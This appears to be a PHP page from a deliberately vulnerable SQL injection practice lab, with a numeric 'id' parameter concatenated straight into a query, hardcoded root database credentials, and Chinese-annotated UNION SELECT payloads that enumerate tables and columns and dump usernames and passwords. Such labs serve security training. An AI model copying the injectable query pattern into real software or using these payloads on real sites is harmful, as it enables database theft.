<?php
// UNION SELECT 注入练习
// 数字型注入点，练习联合查询爆数据
// payload 示例:
//   ?id=-1 UNION SELECT 1,2  -- 找回显位
//   ?id=-1 UNION SELECT database(),user()  -- 爆数据库信息
//   ?id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()  -- 爆表名
//   ?id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'  -- 爆字段
//   ?id=-1 UNION SELECT username,password FROM users  -- 爆数据

$conn = mysqli_connect("db", "root", "root", "test");
mysqli_set_charset($conn, 'utf8mb4');
$id = $_GET['id'] ?? 1;

$sql = "SELECT title, content FROM wp_news WHERE id=$id";

echo "<!DOCTYPE html><html lang='zh'><head><meta charset='UTF-8'><title>联合查询注入</title>
<style>body{font-family:'Segoe UI',sans-serif;max-width:900px;margin:50px auto;background:#1a1a2e;color:#e0e0e0;}
h1{color:#e94560;}pre,code{background:#0f3460;padding:2px 6px;border-radius:3px;}
.result{background:#16213e;padding:15px;margin:10px 0;border-radius:5px;}
a{color:#e94560;}
table{border-collapse:collapse;width:100%;margin:10px 0;}
th,td{border:1px solid #0f3460;padding:8px;text-align:left;}
th{background:#e94560;color:#fff;}
tr:nth-child(even){background:#16213e;}
</style></head><body>";

echo "<h1>UNION SELECT 注入练习</h1>";
echo "<p>执行的SQL: <code>" . htmlspecialchars($sql) . "</code></p>";
echo "<a href='index.php'>← 返回首页</a><hr>";

$res = mysqli_query($conn, $sql);
if ($res && mysqli_num_rows($res) > 0) {
    echo "<table><tr><th>Title</th><th>Content</th></tr>";
    while ($row = mysqli_fetch_row($res)) {
        echo "<tr><td>" . htmlspecialchars($row[0] ?? 'NULL') . "</td><td>" . htmlspecialchars($row[1] ?? 'NULL') . "</td></tr>";
    }
    echo "</table>";
} else {
    echo "<p>查询错误: " . htmlspecialchars(mysqli_error($conn)) . "</p>";
}

// 注入技巧提示
echo "<br><details><summary>UNION注入步骤</summary><pre>
-- 第1步: 判断列数 (二分法)
?id=1 ORDER BY 1   -- 正常
?id=1 ORDER BY 2   -- 正常
?id=1 ORDER BY 3   -- 错误 → 只有2列

-- 第2步: 找显示位
?id=-1 UNION SELECT 1,2

-- 第3步: 爆数据库名
?id=-1 UNION SELECT database(),user()

-- 第4步: 爆表名
?id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()

-- 第5步: 爆字段
?id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'

-- 第6步: 爆数据
?id=-1 UNION SELECT username,password FROM users
</pre></details>";

mysqli_close($conn);
echo "</body></html>";
?>
